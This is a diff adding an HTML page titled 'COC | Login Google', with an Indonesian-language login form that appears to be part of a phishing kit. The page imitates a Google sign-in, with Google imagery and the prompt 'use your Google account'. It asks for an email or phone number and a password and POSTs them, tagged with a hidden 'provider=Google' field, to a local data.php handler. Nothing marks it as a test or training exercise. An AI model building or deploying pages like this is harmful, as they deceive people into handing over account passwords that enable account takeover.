@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>COC | Login Google</title>
+    <link rel="shorcut icon" href="assets/img/favicon.png">
+    <link rel="stylesheet" type="text/css" href="../../assets/css/login.css">
+    <link href="https://fonts.googleapis.com/css?family=Montserrat:300,400,500,700|Open+Sans:300,300i,400,400i,700,700i" rel="stylesheet">
+</head>
+<body>
+    <div id="bg"></div>
+    <div class="idhaam69">
+        <div class="header">
+            <img class="img-header" src="../../assets/img/glog2.png" alt="Idhaam69">
+        </div>
+
+        <div class="form-login">
+            <div class="bd">Login<br>Gunakan Akun Google Anda</div>
+            <form action="../data.php" method="POST">
+                <input type="hidden" name="provider" value="Google">
+                <div class="form-input">
+                    <label>Email atau Telepon</label>
+                    <input type="text" name="username" placeholder="akunanda@gmail.com" required>
+                </div>
+                <div class="form-input">
+                    <label>Password</label>
+                    <input type="password" name="pass" placeholder="*******************" required>
+                </div>
+                <div class="form-input">
+                    <button class="btn-input" name="login">Log In</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
